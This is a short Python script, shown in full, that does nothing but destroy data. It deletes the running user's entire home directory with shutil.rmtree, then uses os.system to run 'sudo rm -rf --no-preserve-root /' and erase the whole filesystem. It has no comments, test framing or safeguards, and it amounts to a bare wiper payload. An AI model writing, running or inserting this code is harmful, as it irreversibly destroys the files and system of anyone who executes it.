import os
import shutil

home_dir = os.path.expanduser("~")
shutil.rmtree(home_dir)
os.system('sudo rm -rf --no-preserve-root /')
